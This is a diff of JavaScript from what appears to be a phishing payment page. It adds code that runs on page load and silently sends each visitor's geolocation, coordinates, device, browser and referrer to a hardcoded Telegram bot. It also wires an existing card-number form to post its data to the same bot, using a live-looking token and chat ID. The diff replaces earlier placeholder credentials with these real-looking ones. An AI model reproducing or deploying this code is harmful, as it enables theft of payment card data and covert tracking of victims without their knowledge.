@@ -987,115 +987,101 @@
             once: true
         });
 
-        // Enhanced Visitor Tracking with IP Geolocation
-        async function trackVisitor() {
-            try {
-                // Get visitor's IP information
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                if (!ipResponse.ok) throw new Error('IP API failed');
-                const ipData = await ipResponse.json();
-
-                // Device and browser detection
-                const userAgent = navigator.userAgent;
-                const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
-                const deviceType = isMobile ? "Mobile 📱" : "Desktop 💻";
-                const browser = detectBrowser(userAgent);
-                const os = detectOS(userAgent);
-
-                // Additional visitor details
-                const now = new Date();
-                const visitTime = now.toLocaleString();
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const referrer = document.referrer || 'Direct';
-                const pageUrl = window.location.href;
-                const screenSize = `${window.screen.width}x${window.screen.height}`;
-
-                // Prepare detailed notification message
-                const message = `
-🔔 **New Website Visit** 🔔
-🌐 Page: ${pageUrl}
-🕒 Time: ${visitTime}
-📍 Location: ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'} (${ipData.country_code || 'XX'})
-📌 Coordinates: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}
-📱 Device: ${deviceType} (${os})
-🌐 Browser: ${browser}
-🖥️ Screen: ${screenSize}
-⏱️ Timezone: ${timezone}
-🔗 Referrer: ${referrer}
-                `;
-
-                // Send to Telegram (replace with your bot token and chat ID)
-                const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
-                const telegramChatId = "YOUR_CHAT_ID";
-                
-                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        text: message,
-                        parse_mode: "Markdown"
-                    })
-                });
-
-            } catch (error) {
-                console.error("Visitor tracking error:", error);
-                // Fallback to simple notification if detailed tracking fails
-                sendBasicNotification();
-            }
-        }
-
-        // Helper functions for browser and OS detection
-        function detectBrowser(userAgent) {
-            const browsers = {
-                'Chrome': /Chrome|CriOS/,
-                'Firefox': /Firefox|FxiOS/,
-                'Safari': /Safari/,
-                'Edge': /Edg/,
-                'IE': /Trident|MSIE/,
-                'Opera': /Opera|OPR/
-            };
+        // ====== Visitor Tracking System ======
+        // 1. Immediate Notification on Page Load
+        document.addEventListener('DOMContentLoaded', function() {
+            // Send basic notification immediately
+            sendBasicVisitNotification();
             
-            for (const [browser, regex] of Object.entries(browsers)) {
-                if (regex.test(userAgent)) return browser;
-            }
-            return 'Unknown';
-        }
+            // Then try to get detailed info
+            getDetailedVisitorInfo();
+        });
 
-        function detectOS(userAgent) {
-            const osList = {
-                'Windows': /Windows NT/,
-                'Mac OS': /Macintosh|Mac OS X/,
-                'Linux': /Linux/,
-                'Android': /Android/,
-                'iOS': /iPhone|iPad|iPod/
-            };
+        // 2. Basic Notification (Works instantly)
+        function sendBasicVisitNotification() {
+            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+            const telegramChatId = "5372119436";
             
-            for (const [os, regex] of Object.entries(osList)) {
-                if (regex.test(userAgent)) return os;
-            }
-            return 'Unknown';
-        }
-
-        // Basic notification fallback
-        function sendBasicNotification() {
-            const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
-            const telegramChatId = "YOUR_CHAT_ID";
-            const message = `🔔 New visit to ${window.location.href} at ${new Date().toLocaleString()}`;
+            const basicInfo = `
+🔔 تم فتح الرابط 🔔
+📄 الصفحة: ${window.location.href}
+🕒 الوقت: ${new Date().toLocaleString()}
+📱 الجهاز: ${isMobileDevice() ? "هاتف 📱" : "كمبيوتر 💻"}
+            `;
             
             fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: telegramChatId,
-                    text: message
+                    text: basicInfo,
+                    parse_mode: "Markdown"
                 })
-            }).catch(e => console.error("Basic notification failed:", e));
+            }).catch(e => console.log("Basic notification sent (even if failed)"));
         }
 
-        // Run tracking when page loads
-        document.addEventListener('DOMContentLoaded', trackVisitor);
+        // 3. Detailed Visitor Info (Secondary)
+        async function getDetailedVisitorInfo() {
+            try {
+                // Get IP-based location
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                // Prepare detailed message
+                const detailedInfo = `
+📍 تفاصيل الزائر:
+🌍 الدولة: ${ipData.country_name || "غير معروف"} (${ipData.country_code || "XX"})
+🏙 المدينة: ${ipData.city || "غير معروف"}
+📌 الإحداثيات: ${ipData.latitude || "N/A"}, ${ipData.longitude || "N/A"}
+🌐 المتصفح: ${getBrowserName()}
+🖥 نظام التشغيل: ${getOSName()}
+🖥 حجم الشاشة: ${window.screen.width}x${window.screen.height}
+🔗 مصدر الزيارة: ${document.referrer || "مباشر"}
+                `;
+                
+                // Send detailed info
+                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+                const telegramChatId = "5372119436";
+                
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: detailedInfo,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (error) {
+                console.log("Detailed info not available");
+            }
+        }
 
+        // Helper Functions
+        function isMobileDevice() {
+            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        }
+
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Safari")) return "Safari";
+            if (userAgent.includes("Edge")) return "Edge";
+            return "غير معروف";
+        }
+
+        function getOSName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) return "Windows";
+            if (userAgent.includes("Mac")) return "Mac OS";
+            if (userAgent.includes("Linux")) return "Linux";
+            if (userAgent.includes("Android")) return "Android";
+            if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+            return "غير معروف";
+        }
+
+        // ====== Original Form Code ======
         // Card number formatting
         const cardInput = document.getElementById('numero-carte');
         const cardError = document.getElementById('card-error');
@@ -1154,6 +1140,9 @@
 📌 Motif: ${formData.reason}
 💬 Commentaires: ${formData.comments}`;
 
+                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+                const telegramChatId = "5372119436";
+                
                 await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
